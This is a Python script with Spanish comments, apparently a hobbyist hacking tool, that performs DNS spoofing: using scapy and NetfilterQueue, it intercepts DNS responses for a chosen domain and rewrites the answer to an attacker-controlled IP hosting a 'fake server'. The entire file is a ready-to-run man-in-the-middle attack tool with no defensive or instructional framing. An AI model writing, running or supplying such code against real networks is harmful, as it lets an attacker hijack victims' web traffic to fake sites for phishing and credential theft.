#!/usr/bin/env python3
# Autor = Pepe >:)

import scapy.all as scapy
import argparse
import sys
from netfilterqueue import NetfilterQueue
from termcolor import colored

def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer - Redirecciona trafico web")
    parser.add_argument("-d", "--domain", dest="target_domain", required=True, help="Dominio a suplantar (ej: www.bing.com)")
    parser.add_argument("-ip", "--my-ip", dest="my_ip", required=True, help="Tu IP local (donde tienes el servidor falso)")

    args = parser.parse_args()
    return args

def process_packet(packet, target_domain, my_ip):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")

        if target_domain in qname:
            print(colored(f"[+] Objetivo detectado: {qname}", "green"))
            print(colored(f"    --> Redirigiendo a: {my_ip}", "yellow"))

            answer = scapy.DNSRR(rrname=qname, rdata=my_ip)

            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

def main():
    args = get_arguments()
    queue = NetfilterQueue()

    try:
        print(colored(f"\n--- DNS SPOOFER ACTIVO ---", "white", attrs=['bold']))
        print(colored(f"[*] Interceptando: {args.target_domain}", "blue"))
        print(colored(f"[*] Redirigiendo a: {args.my_ip}\n", "blue"))
        print(colored("[!] Esperando paquetes", "yellow"))
        
        queue.bind(0, lambda pkt: process_packet(pkt, args.target_domain, args.my_ip))
        queue.run()

    except KeyboardInterrupt:
        print(colored("\n[!] Deteniendo Spoofer...", "yellow"))
        queue.unbind()

if __name__ == "__main__":
    main()
